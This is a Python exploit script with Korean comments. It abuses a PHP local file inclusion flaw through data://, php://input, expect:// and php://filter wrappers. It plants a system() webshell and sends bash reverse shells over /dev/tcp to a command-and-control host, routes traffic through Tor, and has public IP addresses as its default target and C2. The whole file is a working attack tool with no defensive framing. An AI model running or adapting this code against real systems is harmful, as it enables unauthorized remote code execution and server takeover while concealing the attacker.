#!/usr/bin/env python3
"""
PHP wrapper를 이용한 LFI 우회 및 코드 실행
"""

import requests
import base64
import urllib.parse

def php_wrapper_exploit(target_ip, c2_ip, c2_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    })

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] C2: {c2_ip}:{c2_port}")

    # === 전략 1: data:// wrapper ===
    print("\n[1] data:// wrapper 시도...")

    # 웹쉘 코드
    webshell = '<?php system($_GET["x"]); ?>'
    b64_webshell = base64.b64encode(webshell.encode()).decode()

    data_url = f"data://text/plain;base64,{b64_webshell}"

    print(f"[*] Payload: {data_url}")

    # 테스트 명령 없이 바로 리버스 쉘
    reverse_shell = f"bash -c 'bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1'"

    test_urls = [
        # data:// + 명령
        f"{base_url}/file.php?name={urllib.parse.quote(data_url)}&x={urllib.parse.quote(reverse_shell)}",
    ]

    for url in test_urls:
        print(f"\n[*] 시도 중...")
        try:
            resp = session.get(url, timeout=3)
            if resp.status_code == 200:
                print(f"[+] 200 OK")
                print(f"[!] C2 리스너 확인")
            elif resp.status_code == 403:
                print(f"[-] 403 Forbidden")
            else:
                print(f"[?] {resp.status_code}")
        except requests.exceptions.Timeout:
            print(f"[+] 타임아웃 (연결되었을 수 있음!)")
        except Exception as e:
            print(f"[-] 오류: {str(e)[:50]}")

    # === 전략 2: php://input ===
    print("\n[2] php://input wrapper 시도...")

    input_url = f"{base_url}/file.php?name=php://input"

    # POST 데이터로 PHP 코드 전송
    php_code = f'<?php system("{reverse_shell}"); ?>'

    print(f"[*] POST 데이터: {php_code[:50]}...")

    try:
        resp = session.post(input_url, data=php_code, timeout=3)
        if resp.status_code == 200:
            print(f"[+] 200 OK")
            print(f"[!] C2 리스너 확인")
        elif resp.status_code == 403:
            print(f"[-] 403 Forbidden")
        else:
            print(f"[?] {resp.status_code}")
    except requests.exceptions.Timeout:
        print(f"[+] 타임아웃 (연결되었을 수 있음!)")
    except Exception as e:
        print(f"[-] 오류: {str(e)[:50]}")

    # === 전략 3: expect:// wrapper (희귀) ===
    print("\n[3] expect:// wrapper 시도...")

    expect_url = f"{base_url}/file.php?name=expect://{urllib.parse.quote(reverse_shell)}"

    try:
        resp = session.get(expect_url, timeout=3)
        if resp.status_code == 200:
            print(f"[+] 200 OK")
        elif resp.status_code == 403:
            print(f"[-] 403 Forbidden")
        else:
            print(f"[?] {resp.status_code}")
    except requests.exceptions.Timeout:
        print(f"[+] 타임아웃 (연결되었을 수 있음!)")
    except Exception as e:
        print(f"[-] 오류: {str(e)[:50]}")

    # === 전략 4: php://filter + base64 decode ===
    print("\n[4] php://filter wrapper 시도...")

    # 리버스 쉘을 base64로
    b64_shell = base64.b64encode(reverse_shell.encode()).decode()

    # php://filter로 base64 decode해서 실행
    filter_url = f"{base_url}/file.php?name=php://filter/convert.base64-decode/resource=data://text/plain;base64,{b64_shell}"

    try:
        resp = session.get(filter_url, timeout=3)
        if resp.status_code == 200:
            print(f"[+] 200 OK")
        elif resp.status_code == 403:
            print(f"[-] 403 Forbidden")
        else:
            print(f"[?] {resp.status_code}")
    except requests.exceptions.Timeout:
        print(f"[+] 타임아웃 (연결되었을 수 있음!)")
    except Exception as e:
        print(f"[-] 오류: {str(e)[:50]}")

    print("\n[*] PHP wrapper 시도 완료")
    print("[!] C2 리스너를 확인하세요")

def main():
    print("\n[*] PHP wrapper 기반 LFI 익스플로잇")

    target_ip = input("타겟 IP (기본: 43.201.154.142): ").strip() or "43.201.154.142"
    c2_ip = input("C2 IP (기본: 57.181.28.7): ").strip() or "57.181.28.7"
    c2_port = int(input("C2 포트 (기본: 4444): ").strip() or "4444")

    print(f"\n[!] C2 서버에서 리스너 시작:")
    print(f"    nc -lvnp {c2_port}")

    input("\n[?] 준비되면 Enter...")

    php_wrapper_exploit(target_ip, c2_ip, c2_port)

if __name__ == "__main__":
    main()
